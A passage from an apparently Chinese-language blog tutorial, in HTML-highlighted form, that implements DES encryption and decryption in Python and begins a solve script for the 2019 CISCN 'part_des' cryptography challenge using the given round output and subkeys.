class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>], [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>], [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>], [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>], [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>], [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>], [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">    ]]</span><br><span class="line"></span><br><span class="line">    m = [m[i:i + <span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">6</span>)]</span><br><span class="line">    res = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p = m[i]</span><br><span class="line">        z = <span class="built_in">int</span>(<span class="built_in">str</span>(p[<span class="number">0</span>]) + <span class="built_in">str</span>(p[<span class="number">5</span>]), <span class="number">2</span>)</span><br><span class="line">        h = <span class="built_in">int</span>(<span class="built_in">str</span>(p[<span class="number">1</span>]) + <span class="built_in">str</span>(p[<span class="number">2</span>]) + <span class="built_in">str</span>(p[<span class="number">3</span>]) + <span class="built_in">str</span>(p[<span class="number">4</span>]), <span class="number">2</span>)</span><br><span class="line">        r = s[i][z][h]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">bin</span>(r)[<span class="number">2</span>:].zfill(<span class="number">4</span>):</span><br><span class="line">            res.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># E盒扩展</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Expand</span>(<span class="params">m</span>):</span><br><span class="line">    e = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> e]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># P盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">m</span>):</span><br><span class="line">    p = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> p]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 16轮加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cipher_function</span>(<span class="params">m, sub_key</span>):</span><br><span class="line">    t = xor(Expand(m), sub_key)</span><br><span class="line">    t = S(t)</span><br><span class="line">    t = P(t)</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交换左右子秘钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_round</span>(<span class="params">l, r, sub_key</span>):</span><br><span class="line">    <span class="keyword">return</span> r, xor(l, cipher_function(r, sub_key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    sub_keys = key_generate(key)</span><br><span class="line">    l, r = IP(plain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    <span class="keyword">return</span> FP(r + l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    sub_keys = key_generate(key)[::-<span class="number">1</span>]</span><br><span class="line">    l, r = IP(plain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    <span class="keyword">return</span> FP(r + l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_encrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    <span class="comment"># 字符串转16进制</span></span><br><span class="line">    plain = <span class="built_in">int</span>(plain.encode().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 再转2进制数组</span></span><br><span class="line">    plain_array = int2bin(plain, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 秘钥转16进制</span></span><br><span class="line">    key = <span class="built_in">int</span>(key.encode().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 再转2进制数组</span></span><br><span class="line">    key_array = int2bin(key, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 加密运算</span></span><br><span class="line">    encrypt_array = encrypt(plain_array, key_array)</span><br><span class="line">    <span class="comment"># 2进制数组转数值</span></span><br><span class="line">    encrypt_res = bin2int(encrypt_array)</span><br><span class="line">    <span class="keyword">return</span> encrypt_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_decrypt</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    <span class="comment"># 密文转2进制数组</span></span><br><span class="line">    cipher_array = int2bin(cipher, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 秘钥转16进制</span></span><br><span class="line">    key = <span class="built_in">int</span>(key.encode().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 再转2进制数组</span></span><br><span class="line">    key_array = int2bin(key, <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 解密运算</span></span><br><span class="line">    decrypt_array = decrypt(cipher_array, key_array)</span><br><span class="line">    <span class="comment"># 2进制数组转16进制字符串</span></span><br><span class="line">    decrypt_res = <span class="built_in">hex</span>(bin2int(decrypt_array))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(decrypt_res).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = des_encrypt(<span class="string">&quot;south&quot;</span>, <span class="string">&quot;sea&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">m = des_decrypt(c, <span class="string">&quot;sea&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
<h5 id="一些结论">一些结论</h5>
<ul>
<li><strong>IP与FP置换对于安全没有意义</strong>，是历史遗留问题，<strong>FP</strong>是<strong>IP</strong>的逆置换。</li>
<li><strong>S</strong>盒作为<strong>DES</strong>算法中唯一的非线性器件，是加密的关键所在，然而，多年来，一直未有人将<strong>S</strong>盒的设计准则公开。</li>
<li><strong>Expand</strong>拓展目的是在加密数据的过程中制造一些<strong>雪崩效应</strong>，使用数据块中的<strong>1</strong>位将在下一步操作中影响更多位，从而产生<strong>扩散效果</strong>。</li>
</ul>
<h4 id="例题-2019-ciscn-part_des">例题 2019-CISCN-part_des</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Round n part_encode-&gt; 0x92d915250119e12b</span><br><span class="line">Key map -&gt; 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84</span><br></pre></td></tr></table></figure>
<p>题目名是<strong>part_des</strong>。</p>
<p>给了一个<strong>Round n
part_encode</strong>，长度为<strong>64</strong>位，可知是第<strong>n</strong>轮加密的结果。</p>
<p>给了一个<strong>key_map</strong>，长度为<strong>768</strong>位，除<strong>16</strong>得<strong>48</strong>，可知是<strong>16</strong>把<strong>48</strong>位的子秘钥。</p>
<p>可知，这是DES加密的中间结果，需要对其进行解密。</p>
<p>因此将上述加密过程加以改造即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># @Author: south</span></span><br><span class="line"><span class="comment"># @Date: 2022-05-16 21:57</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数值转2进制数组位数扩展</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2bin</span>(<span class="params">m, n</span>):</span><br><span class="line">    m = <span class="built_in">bin</span>(m)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> n &gt;= <span class="built_in">len</span>(m):</span><br><span class="line">        m = m.zfill(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = m[<span class="built_in">len</span>(m) - n:]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2进制数组转数值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2int</span>(<span class="params">a</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        s += <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异或</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> [x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左移</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">res, offset</span>):</span><br><span class="line">    <span class="keyword">return</span> res[offset:] + res[:offset]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PC1盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC1</span>(<span class="params">key</span>):</span><br><span class="line">    pc1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">           <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">           <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">           <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">    k1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc1:</span><br><span class="line">        k1.append(key[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> k1[<span class="number">0</span>:<span class="number">28</span>], k1[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PC2盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC2</span>(<span class="params">key</span>):</span><br><span class="line">    pc2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">           <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">           <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">           <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">return</span> [key[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> pc2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_generate</span>(<span class="params">key</span>):</span><br><span class="line">    l, r = PC1(key)</span><br><span class="line">    offset = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> offset:</span><br><span class="line">        l = left_rotate(l, i)</span><br><span class="line">        r = left_rotate(r, i)</span><br><span class="line">        res.append(PC2(l + r))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IP盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">message</span>):</span><br><span class="line">    ip = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">          <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">          <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">          <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">    m1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">        m1.append(message[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> m1[<span class="number">0</span>:<span class="number">32</span>], m1[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># FP盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FP</span>(<span class="params">m</span>):</span><br><span class="line">    fp = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">          <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">          <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">          <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> fp]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># S盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S</span>(<span class="params">m</span>):</span><br><span class="line">    s = [[</span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>], [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>], [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>], [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>], [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>], [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>], [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>], [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span 